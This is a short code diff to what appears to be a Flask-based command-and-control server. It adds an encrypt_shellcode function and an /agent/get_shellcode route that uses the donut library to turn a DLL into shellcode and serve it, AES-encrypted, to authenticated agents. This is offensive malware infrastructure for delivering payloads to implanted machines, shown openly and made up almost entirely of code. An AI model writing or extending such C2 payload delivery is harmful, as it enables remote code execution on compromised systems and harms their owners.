@@ -4,6 +4,7 @@ from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
 import hashlib
 from aesgcm import encrypt, decrypt
 import json
+import donut
 from creds import db_cred
 
 
@@ -123,6 +124,12 @@ def decrypt_data(byte_str):
 def encrypt_data(data):
     byte_data = json.dumps(data).encode()
     iv, ct, tag = encrypt(aes_key, byte_data)
+    serialized = serialize(iv, tag, ct)
+
+    return serialized
+
+def encrypt_shellcode(shellcode):
+    iv, ct, tag = encrypt(aes_key, shellcode)
     serialized = serialize(iv, tag, ct)
 
     return serialized
@@ -280,7 +287,13 @@ def send_result():
         print("[-] the agent has failed to authenticate")
         return encrypt_data({"status": "authentication failed"})
 
-
+@app.route('/agent/get_shellcode', methods=['GET'])
+def get_shellcode():
+    shellcode = donut.create(
+        file = "test.dll",
+        method = "IAmAGoodNoodle"
+    )
+    return encrypt_shellcode(shellcode)
 
 @app.route("/")
 def login():
